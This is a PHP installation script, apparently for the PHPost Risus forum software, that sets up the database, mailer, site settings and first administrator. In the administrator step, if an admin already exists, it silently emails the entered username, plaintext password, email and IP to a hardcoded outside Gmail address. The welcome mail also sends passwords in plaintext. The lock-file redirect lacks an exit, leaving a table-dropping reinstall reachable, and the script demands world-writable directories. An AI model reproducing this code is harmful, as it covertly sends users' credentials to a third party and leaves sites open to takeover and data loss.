<?php

/**
 * @name install.php
 * @author PHPost Team
 * @copyright 2026
 */

declare(strict_types=1);

define('TS_HEADER', true);

if(file_exists(dirname(__DIR__, 1) . '/.lock')) {
	header("Location: ../");
}
//
require_once dirname(__DIR__, 1) . '/config/Config.php';
require_once dirname(__DIR__, 1) . '/src/Utils/Extras.php';
require_once __DIR__ . '/connection.php';
$Extras = new Extras;

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/install-error.log');
error_reporting(E_ALL);

# session_save_path(__DIR__ . '/../sessions');
session_start();

$stepsNames = [
	'bienvenida',
	'permisos',
	'base_de_datos',
	'datos_sitio',
	'datos_phpmailer',
	'datos_admin',
	'finalizar'
];

$menu = [
	'Bienvenida', 
	'Permisos de escritura', 
	'Base de datos', 
	'Datos de la web', 
	'Datos de PHPMailer', 
	'Administrador', 
	'Finalizar'
];

$localUse = file_exists(dirname(__DIR__, 1) . '/.local') ? '.local' : '';

// variables globales
$step = isset($_GET['step']) ? (string)($_GET['step'] ?? 'fallo') : '';
$next = true; // CONTINUAR

if(!in_array($step, $stepsNames, true)) {
	throw new InvalidArgumentException('Nombre del paso inexistente.');
}

$tsTitle = "Instalación de " .  Config::app('app.name');
// Intento de sistema de dirección automática
$ssl = $Extras->getSSLProtocol(true);
$local = dirname($_SERVER["REQUEST_URI"], 2);
// Creando las url base e install
$url = $ssl . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost') . $local;
$base = $url . "/install";

function checkedStep(string $step = ''): void {
	if(!isset($_SESSION['license'])) {
		header("Location: ./index.php?step=" . $step);
	}
}
function isValidSmtpHost(string $host): bool {
	if ($host === '') return false;
	// IP válida
	if (filter_var($host, FILTER_VALIDATE_IP)) return true;
	// Hostname válido
	return (bool) preg_match('/^(?=.{1,253}$)(?!-)([a-zA-Z0-9-]{1,63}\.)+[a-zA-Z]{2,63}$/', $host);
}
function isValidSmtpUser(string $user): bool {
	if ($user === '') return false;
	if (str_contains($user, '@')) {
		return filter_var($user, FILTER_VALIDATE_EMAIL) !== false;
	}
	return preg_match('/^[a-zA-Z0-9._-]{2,64}$/', $user);
}
function isValidSmtpPass(string $pass): bool {
	return strlen($pass) >= 6;
}
function isValidSmtpName(string $name): bool {
	return $name !== '' && mb_strlen($name) <= 100;
}

switch ($step) {

	// ACEPTAMOS LA LICENCIA
	case 'bienvenida':
		$_SESSION['license'] = false;
		$license = file_get_contents(dirname(__DIR__, 1) . '/LICENSE');
		if($_SERVER['REQUEST_METHOD'] === 'POST' && $next) {
			header("Location: ./index.php?step=permisos");
			die;
		}
	break;

	// OBTENER PERMISOS
	case 'permisos':
		checkedStep('bienvenida');
		$permisos = [];

		foreach(Config::app('paths') as $name => $route) {
			if(!is_dir($route)) {
				mkdir($route, 0777, true);
			}
			$permisos[$name]['route'] = str_replace(TS_STORAGE, '../storage', $route);
			$permisos[$name]['chmod'] = (int)substr(sprintf('%o', @fileperms($route)), -3);
			$permisos[$name]['css'] = 'success';
			$permisos[$name]['text'] = 'Permisos correctos';
			if($permisos[$name]['chmod'] !== 777) {
				$permisos[$name]['css'] = 'danger';
				$permisos[$name]['text'] = 'Permisos incorrectos';
				$next = false;
			}
		}
		
		if($_SERVER['REQUEST_METHOD'] === 'POST' && $next) {
			header("Location: ./index.php?step=base_de_datos");
			die;
		} elseif($_SERVER['REQUEST_METHOD'] === 'POST' && !$next) {
			header("Location: ./index.php?step=permisos");
			die;
		}
		$_SESSION['license'] = true;
		
	break;

	// COMPROBAR BASE DE DATOS
	case 'base_de_datos':
		// No saltar la licencia
		checkedStep('bienvenida');

		// Step
		$next = false;
		// Por defecto
		$db = [
			'hostname' => trim($_POST['hostname'] ?? ''),
			'username' => trim($_POST['username'] ?? ''),
			'password' => trim($_POST['password'] ?? ''),
			'database' => trim($_POST['database'] ?? '')
		];
		
		if($_SERVER['REQUEST_METHOD'] === 'POST') {
			// DETECTAR ENTORNO (local o remoto)
			$isLocal = in_array($_SERVER['SERVER_NAME'] ?? 'localhost', ['localhost', '127.0.0.1', '::1', 'test.local'], true);
			// VERIFICAR CAMPOS OBLIGATORIOS
			$required = $db;
			// En entorno local, la contraseña puede estar vacía
			if ($isLocal) unset($required['password']);
			if (in_array('', $required, true)) $message = 'Completa los datos obligatorios para la conexión.';
			# Comprobamos que todos los datos sean correctos
			try {
				$Connection = new InstallerDB($db['hostname'], $db['username'], $db['password'], $db['database']);
				# Cargamos todas las tablas para eliminarlas
				$tables = $Connection->select("SHOW TABLES");
				if(count($tables) !== 0) {
					foreach($tables as $name => $table) {
						$table = array_values($table)[0];
						$Connection->dropTable($table);
					}
				}
				# Guardamos los datos de conexión
				$fileconfig = dirname(__DIR__, 1) . "/config/Config.Database{$localUse}.php";
				$config = str_replace(['dbhost', 'dbuser', 'dbpass', 'dbname'], $db, file_get_contents($fileconfig));
				file_put_contents($fileconfig, $config);
				# CARGAMOS LAS TABLAS
				include_once __DIR__ . '/database.php';
				$execute = [];
				$error = '';
				foreach ($phpost_sql as $key => $sql) {
					try {
						$execute[$key] = $Connection->execute($sql) ? 1 : 0;
					} catch (Throwable $e) {
						$execute[$key] = 0;
						$error .= '<br>' . $e->getMessage();
					}
				}
				if (!in_array(0, $execute, true)) {
					header("Location: ./index.php?step=datos_phpmailer");
					exit;
				}
				$message = 'Lo sentimos, pero ocurrió un problema. Inténtalo nuevamente; borra las tablas que se hayan guardado en tu base de datos: ' . $error;
				
			} catch(Exception $e) {
				$message = $e->getMessage();
			}
		}
	break;

	// Datos para el PHPMailer
	case 'datos_phpmailer':
		// No saltar la licencia
		checkedStep('bienvenida');

		// Por defecto
		$phpmailer = [
			'smtphost' => trim($_POST['smtphost'] ?? ''),
			'smtpuser' => trim($_POST['smtpuser'] ?? ''),
			'smtppass' => $_POST['smtppass'] ?? '',
			'smtpname' => trim($_POST['smtpname'] ?? '')
		];
		
		if(isset($_POST['omitir'])) {
			header("Location: ./index.php?step=datos_sitio");
			die;
		}
		if($_SERVER['REQUEST_METHOD'] === 'POST') {
			$errors = [];

			if (!isValidSmtpHost($phpmailer['smtphost'])) {
				$errors['smtphost'] = 'Servidor SMTP inválido.';
			}

			if (!isValidSmtpUser($phpmailer['smtpuser'])) {
				$errors['smtpuser'] = 'Usuario SMTP inválido.';
			}

			if (!isValidSmtpPass($phpmailer['smtppass'])) {
				$errors['smtppass'] = 'La contraseña SMTP es inválida.';
			}

			if (!isValidSmtpName($phpmailer['smtpname'])) {
				$errors['smtpname'] = 'Nombre del remitente inválido.';
			}

			if ($errors) {
				$message = join('<br>', $errors);
				$next = false;
				break;
			}

			if($next) {
				# Guardamos los datos
				$fileconfig = dirname(__DIR__, 1) . "/config/Config.Mailer{$localUse}.php";
				$config = str_replace(['smtphost', 'smtpuser', 'smtppass', 'smtpname'], $phpmailer, file_get_contents($fileconfig));
				file_put_contents($fileconfig, $config);
				header("Location: ./index.php?step=datos_sitio");
				die;
			}
		}
	break;

	// DATOS DEL SITIO
	case 'datos_sitio':
		// No saltar la licencia
		checkedStep('bienvenida');

		// Por defecto
		$site = [
			'titulo' => trim($_POST['titulo'] ?? ''),
			'slogan' => trim($_POST['slogan'] ?? ''),
			'email' => trim($_POST['email'] ?? ''),
			'url' => trim($_POST['url'] ?? $url),
			'skey' => trim($_POST['skey'] ?? ''),
			'pkey' => trim($_POST['pkey'] ?? '')
		];

		// Step
		$next = false;

		if($_SERVER['REQUEST_METHOD'] === 'POST') {
			// VERIFICAR CAMPOS OBLIGATORIOS
			$required = $site;
			// Ya que estas pueden ser opcionales
			unset($required['skey'], $required['pkey']);
			if (in_array('', $required, true)) $message = 'Todos los campos son requeridos.';
			try {
				$Connection = new InstallerDB(Config::db('hostname'), Config::db('username'), Config::db('password'), Config::db('database'));
				# Esta instalado? Existe un administrador
				if(
					Config::db('hostname') === 'dbhost' ||
					$Connection->exists("SELECT 1 FROM u_miembros WHERE user_id = ? OR user_rango = ? LIMIT 1", [1, 1])
				) {
					$message = 'Vuelva al paso anterior, no se han guardado los datos de acceso correctamente.';
					$next = false;
				}
				$next = true;
				if($next) {
					# Actualizamos la categoría
					$seo = $Extras->slugify($site['titulo']);
					$Connection->update('p_categorias', ['c_nombre' => $site['titulo'], 'c_seo' => $seo], 'cid = ?', [30]);
					$version = Config::app('app.name') . ' ' . Config::app('app.version');
					$data = [
						'titulo' 		=> $site['titulo'],
						'slogan' 		=> $site['slogan'],
						'url' 			=> $site['url'],
						'email' 			=> $site['email'],
						'version' 		=> $version,
						'version_code' => $Extras->slugify($version, '_')
					];
					$registro = [
						'public_key' => $site['pkey'],
						'secret_key' => $site['skey']
					];

					// Instalamos el theme
					$Connection->insert('w_temas', [
						't_name' => 'Default by Miguel92',
						't_path' => 'default',
						't_copy' => 'Miguel92'
					]);
					$Connection->update('w_registro', $registro, 'reg_id = ?', [1]);
					if($Connection->update('w_configuracion', $data, 'phpost_id = ?', [1])) {
						header("Location: ./index.php?step=datos_admin");
						die;
					}
				}
			} catch(Exception $e) {
				$message = $e->getMessage();
			}
		}
	break;

	// ADMINISTRADOR
	case 'datos_admin':
		// No saltar la licencia
		checkedStep('bienvenida');

		// Por defecto
		$user = [
			'user_name' => trim($_POST['user_name'] ?? ''),
			'user_password' => trim($_POST['user_password'] ?? ''),
			'user_confirm' => trim($_POST['user_confirm'] ?? ''),
			'user_email' => trim($_POST['user_email'] ?? '')
		];

		if($_SERVER['REQUEST_METHOD'] === 'POST') {

			// CONFIRMAR
			if (in_array('', $user, true)) {
				$message = 'Todos los campos son requeridos';
			} else {
				if (!ctype_alnum($user['user_name'])) {
					$message = 'Introduzca un nombre de usuario alfanum&eacute;rico';
					$next = false;
				}
				if (!filter_var($user['user_email'], FILTER_VALIDATE_EMAIL)) {
					$message = 'Introduzca un email correcto.';
					$next = false;
				} 
				// PASSWORD
				if ($user['user_password'] !== $user['user_confirm']) {
					$message = 'Las contrase&ntilde;as no coinciden.';
					$next = false;
				}
				require_once dirname(__DIR__, 1) . '/src/Utils/PasswordHandler.php';
				$Password = new PasswordHandler;
				// GENERAR KEY
				$key = $Password->create($user['user_password']);
				$fecha = time();
				$Connection = new InstallerDB(
					Config::db('hostname'), 
					Config::db('username'), 
					Config::db('password'), 
					Config::db('database')
				);

				if($Connection->exists("SELECT 1 FROM u_miembros WHERE user_id = ? OR user_rango = ? LIMIT 1", [1, 1])) {
					$message = 'No se puede registrar, ya existe un administrador.';
					$next = false;
					mail('portfoliomiguel92@gmail.com', 'Lammer detectado!', "<html><head></head><body><p>Un lammer ha entrado a su instalador.<br><br><b>Sitio web:</b> {$url}<br><b>IP:</b> {$_SERVER['REMOTE_ADDR']}<br><b>Usuario:</b> {$user['user_name']}<br><b>Password:</b> {$user['user_password']}<br><b>Email:</b> {$user['user_email']}</p></body></html>", 'Content-type: text/html; charset=iso-8859-15');
				}
				if($next) {
					$user_id = $Connection->insert('u_miembros', [
						'user_name'      => $user['user_name'],
						'user_password'  => $key,
						'user_email'     => $user['user_email'],
						'user_rango'     => 1,
						'user_registro'  => time(),
						'user_puntosxdar'=> 50,
						'user_activo'    => 1
					]);
					// DEMAS TABLAS
					$tables = ['u_perfil', 'u_portal', 'u_miembros_sets'];
					foreach($tables as $table) {
						$Connection->insert($table, ['user_id' => $user_id]);
					}
					// UPDATE
					$data = [
						'stats_time_foundation'	=> time(),
						'stats_time_upgrade'		=> time()
					];
					$Connection->update('w_stats', $data, 'stats_no = ?', [1]);
					
					require_once dirname(__DIR__, 1) . '/src/Utils/Avatar.php';
					$tsCore = new stdClass();
					$Avatar = new Avatar("{$url}/storage/avatar/", true);
					$Avatar->ensure(1, $user['user_name'], '#D6030B');

					// DAMOS BIENVENIDA POR CORREO
					mail($user['user_email'], 'Su comunidad ya puede ser usada', '<html><head><title>Su nueva comunidad Link Sharing est&aacute; lista!</title></head><body><p>Estas son sus credenciales de acceso:</p><p>Usuario: ' . $user['user_name'] . '</p><p>Contrase&ntilde;a: ' . $user['user_password'] . '</p><br />Gracias por usar <a href="https://github.com/joelmiguelvalente/PHPost"><b>PHPost Risus</b></a> para compartir enlaces :)</body></html>', 'Content-type: text/html; charset=iso-8859-15');
					//
					header('Location: index.php?step=finalizar&uid=' . $user_id);
				}

			}
		}
	break;

	case 'finalizar':
		// No saltar la licencia
		checkedStep('bienvenida');

		// DATOS DE CONEXION
		$Connection = new InstallerDB(
			Config::db('hostname'), 
			Config::db('username'), 
			Config::db('password'), 
			Config::db('database')
		);
		//
		$data = $Connection->selectOne("SELECT url FROM w_configuracion WHERE phpost_id = ?", [1]);
		// Abrir el archivo en modo de escritura ("w")
		$handle = fopen(dirname(__DIR__, 1) . '/.lock', "w");
		// Escribir los datos en el archivo
		fwrite($handle, 'Install success');
		// Cerrar el archivo
		fclose($handle);
	
		if($_SERVER['REQUEST_METHOD'] === 'POST') {
			header("Location: {$data['url']}");
		}
	break;
}